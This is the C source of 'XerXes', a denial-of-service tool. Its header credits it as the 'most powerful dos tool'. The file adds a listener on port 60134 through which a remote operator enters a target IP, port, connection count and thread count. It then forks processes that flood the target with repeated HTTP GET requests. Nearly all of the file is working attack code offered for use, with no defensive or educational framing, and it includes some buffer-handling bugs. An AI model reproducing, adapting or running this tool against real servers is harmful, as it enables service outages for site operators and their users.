/* XerXes - Most powerful dos tool - THN (http://www.thehackernews.com) */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

int Threads = 0;
int Connections = 0;
char hostd[16];
char portd[16];

int make_socket(char *host, char *port) 
{
	struct addrinfo hints, *servinfo, *p;
	int sock, r;

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;//TCP

	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0)
	{ 
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
		exit(0);
	}
	for(p = servinfo; p != NULL; p = p->ai_next) 
	{
		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1)
			continue;
		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) 
		{
			close(sock);
			continue;
		}
		break;
	}
	if(p == NULL) 
	{
		if(servinfo)
			freeaddrinfo(servinfo);
		fprintf(stderr, "No connection could be made\n");
		exit(0);
	}
	if(servinfo)
		freeaddrinfo(servinfo);
	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
	return sock;
}

void broke(int s) 
{
	// do nothing
}

void attack(char *host, char *port, int id) 
{
	int sockets;
	int r, i, n, buf;
	int x = 0;
	char string[10];
	static int j = 0;
	char httpbuf[2024];
	char s_copy[132];

	sockets = 0;
	signal(SIGPIPE, &broke);

	while(1) 
	{
		x = 0;
		while(x != Connections)
		{
			if(sockets == 0)
				sockets = make_socket(host, port);
    
			srand(time(NULL));
			for( j = 0; j < 9; j++)
       			string[j] = 'A' + rand()%26; // starting on 'A', ending on 'Z'	
	
			sprintf(httpbuf, "GET /%s HTTP/1.0\r\n\r\n", string);
			strncpy(s_copy, httpbuf, sizeof(s_copy));
			int sizebuf = sizeof s_copy - 1;
			r=write(sockets, s_copy, sizebuf);
			close(sockets);
			sockets = make_socket(host, port);
			fprintf(stderr, "[Thread:%i Connection:%d %s]\n", id,x,s_copy);
			x++;
		}
		usleep(100000);
	}
}
//Modify this function
int create_socket(char *host, char *port) 
{
	int socket_desc , client_sock , c , read_size;
    struct sockaddr_in server , client;
    char client_message[16];
	int j = 0;
	int x = 0;

    //Create socket
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);
    if (socket_desc == -1)
    {
        fprintf(stderr,"Could not create socket\n");
    }
    fprintf(stderr, "Socket created\n");
     
    //Prepare the sockaddr_in structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons( 60134 );
     
    //Bind
    if( bind(socket_desc,(struct sockaddr *)&server , sizeof(server)) < 0)
    {
        //print the error message
        fprintf(stderr,"bind failed. Error\n");
        return 1;
    }
    fprintf(stderr,"bind done\n");
     
    //Listen
    listen(socket_desc , 3);
     
    //Accept and incoming connection
    fprintf(stderr,"Waiting for incoming connections...\n");
    c = sizeof(struct sockaddr_in);
     
    //accept connection from an incoming client
    client_sock = accept(socket_desc, (struct sockaddr *)&client, (socklen_t*)&c);
    if (client_sock < 0)
    {
        fprintf(stderr,"accept failed\n");
        return 1;
    }
    fprintf(stderr,"Connection accepted\n");
	if(send(client_sock, "Connection accepted Enter IP:\n", 31, 0) == -1)
		fprintf(stderr, "Send failed\n");
     
    //Receive a message from client
    while( (read_size = recv(client_sock , client_message , 16 , 0)) > 0 )
    {
		if(j == 0) 
		{
			strncpy(hostd,client_message,strlen(client_message)-2);
			fprintf(stderr, "Attack IP: %s\n", hostd);
			if(send(client_sock, client_message , strlen(client_message), 0) == -1)
				fprintf(stderr, "Send failed\n");
			if(send(client_sock, "Enter Port:\n", 12, 0) == -1)
				fprintf(stderr, "Send failed\n");

			for(int i = 0; i <= 16; i++)
				client_message[i] = '\0';
		}
		if(j == 1) 
		{
			strncpy(portd,client_message,strlen(client_message)-2);
			fprintf(stderr, "Attack Port: %s\n", portd);
			if(send(client_sock, client_message , strlen(client_message), 0) == -1)
				fprintf(stderr, "Send failed\n");
			if(send(client_sock, "Enter Connections:\n", 19, 0) == -1)
				fprintf(stderr, "Send failed\n");
			for(int i = 0; i <= 16; i++)
				client_message[i] = '\0';
		}
		if(j == 2) 
		{
			Connections = atoi(client_message);
			fprintf(stderr, "Connections: %d\n", Connections);
			if(send(client_sock, "Enter Threads:\n", 15, 0) == -1)
				fprintf(stderr, "Send failed\n");
			for(int i = 0; i <= 16; i++) 
				client_message[i] = '\0';
		}
		if(j == 3) 
		{
			Threads = atoi(client_message);
			fprintf(stderr, "Threads: %d\n", Threads);
			break;
		}
		j++;
    }

    while( x != Threads)
	{
		++x;
		if(fork())
			attack(hostd, portd, x);
		usleep(200000);
	}
    return 0;
}
int main(int argc, char **argv) 
{
	int socket;

	socket = create_socket("localhost", "60134");
	close(socket);

	return 0;
}